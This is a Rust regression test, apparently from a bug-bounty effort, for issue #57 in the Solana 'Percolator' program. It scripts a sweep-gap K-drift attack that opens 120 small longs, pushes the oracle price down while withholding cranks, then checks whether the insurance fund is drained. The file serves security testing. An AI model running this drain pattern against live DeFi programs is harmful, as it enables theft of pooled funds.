//! Sweep-Gap K-Drift attack against the Percolator bounty 3 program.
//!
//! Hypothesis (issue #57):
//!   The KeeperCrank Phase-2 round-robin sweep takes ~MAX_ACCOUNTS cranks
//!   to cycle through every used account slot. During that window,
//!   untouched accounts accrue K-coefficient drift WITHOUT PnL
//!   reconciliation. If oracle moves enough between sweep visits to push
//!   an untouched account's drift > capital, the eventual sweep visit
//!   produces a deficit that `use_insurance_buffer` absorbs from the
//!   insurance fund.
//!
//! Win condition: `engine.insurance_fund.balance` strictly decreases.
//!
//! Run: `cargo test --features small --test test_sweepgap_kdrift_attack --release`

mod common;
#[allow(unused_imports)]
use common::*;

use solana_sdk::signature::{Keypair, Signer};

#[test]
fn test_sweepgap_kdrift_attack() {
    let mut env = TestEnv::new();
    env.init_market_with_invert(0);

    let admin = Keypair::from_bytes(&env.payer.to_bytes()).unwrap();
    env.top_up_insurance(&admin, 5_000_000_000);

    // Seed price baseline at the harness default (138_000_000) so all
    // subsequent price walks are anchored. crank() to flush any init-time
    // accrual and stamp last_good_oracle_slot.
    env.set_slot_and_price(100, 138_000_000);
    env.crank();

    // Whale LP that will counterparty every user position. Big enough
    // capital that the LP itself never breaches maintenance — we want
    // user-side accounts to be the ones whose K-drift outruns capital.
    let lp = Keypair::new();
    let lp_idx = env.init_lp(&lp);
    env.deposit(&lp, lp_idx, 100_000_000_000);

    // Create at least 100 user accounts. With MAX_ACCOUNTS=256 (--features
    // small) this comfortably fits, leaving headroom for the LP and any
    // dummy slots. Each user takes a small long position; the LP fills the
    // matching short.
    const N_USERS: usize = 120;
    let mut users: Vec<(Keypair, u16)> = Vec::with_capacity(N_USERS);
    for _ in 0..N_USERS {
        let u = Keypair::new();
        let u_idx = env.init_user(&u);
        // Top-up so the user has a few orders of magnitude more capital
        // than the new-account-fee. We want capital small enough that a
        // 4-5% adverse drift wipes it, but not so small that admission
        // bounces. 200_000 with min_nonzero_im_req=22 admits a tiny long.
        env.deposit(&u, u_idx, 200_000);
        users.push((u, u_idx));
    }

    // Open every user's long position via TradeNoCpi. Position size in
    // POS_SCALE (= 1e6) units; small positions keep IM within each user's
    // 200k capital. notional = pos_size * mark_e6 / POS_SCALE; IM = 10%
    // of notional. With pos_size=1_000 and mark=138e6: notional=138_000,
    // IM=13_800, well below 200k capital.
    let pos_size: i128 = 1_000;
    for (u, u_idx) in users.iter() {
        // The trade ix takes lp_idx + user_idx + size. The LP is the
        // matched short; user is the long. trade() uses lp.sign() for
        // TradeNoCpi.
        env.trade(u, &lp, lp_idx, *u_idx, pos_size);
    }

    // Snapshot insurance pre-attack.
    let insurance_pre = env.read_insurance_balance();
    let vault_pre = env.read_engine_vault();
    println!(
        "PRE: insurance={} engine_vault={} num_used={}",
        insurance_pre,
        vault_pre,
        env.read_num_used_accounts()
    );

    // Adversarial price walk: drive oracle adversely (DOWN, so longs lose)
    // toward maintenance-margin breach. With max_price_move_bps=4 per slot
    // and maintenance_margin_bps=500, ~1300 slots is enough to land a >5%
    // adverse drift. The set_slot_and_price helper auto-walks in chunks.
    //
    // Critical pattern for sweep-gap: minimize cranks during the walk so
    // round-robin settle Phase 2 falls behind. The helper's own internal
    // try_crank_once is best-effort, but we deliberately do NOT call
    // env.crank() between price steps so most user accounts remain
    // untouched while their K-drift compounds.
    let target_slot: u64 = 1_500;
    let adverse_px: i64 = 130_000_000; // ~5.8% down from 138M

    env.set_slot_and_price(target_slot, adverse_px);

    // Now force the sweep to visit every account by cranking many times.
    // If issue #57 is live, the accumulated K-drift on untouched accounts
    // exceeds their 200k capital and the deficit is absorbed by insurance
    // via use_insurance_buffer.
    //
    // We crank generously — N_USERS plus headroom — to ensure the
    // round-robin reaches every slot at least once.
    let crank_rounds = (N_USERS as u64) * 3;
    let mut ok = 0u64;
    let mut err = 0u64;
    for _ in 0..crank_rounds {
        match env.try_crank() {
            Ok(()) => ok += 1,
            Err(_) => err += 1,
        }
    }
    println!("CRANKS: ok={} err={}", ok, err);

    // Push the price further adversely to widen any open deficit, then
    // crank again. This captures the case where the FIRST sweep visit
    // realized a partial deficit and a SECOND visit (after another move)
    // realizes more.
    let target_slot2 = target_slot + 1_500;
    let adverse_px2: i64 = 122_000_000; // ~11.6% total down from 138M
    env.set_slot_and_price(target_slot2, adverse_px2);

    for _ in 0..crank_rounds {
        let _ = env.try_crank();
    }

    let insurance_post = env.read_insurance_balance();
    let vault_post = env.read_engine_vault();
    let delta = insurance_pre as i128 - insurance_post as i128;
    println!(
        "POST: insurance={} engine_vault={} delta={}",
        insurance_post, vault_post, delta
    );

    // Drained-insurance threshold: anything beyond ~10k units of rounding
    // dust is a real exploit win.
    const TOLERANCE: u128 = 10_000;
    let drop = insurance_pre.saturating_sub(insurance_post);
    println!(
        "RESULT: insurance_pre={} insurance_post={} drop={}",
        insurance_pre, insurance_post, drop
    );

    assert!(
        drop <= TOLERANCE,
        "VIOLATION: Sweep-Gap K-Drift drained insurance by {} units (pre={}, post={}, tolerance={}). \
         Bounty win — issue #57 regressed.",
        drop,
        insurance_pre,
        insurance_post,
        TOLERANCE,
    );
}
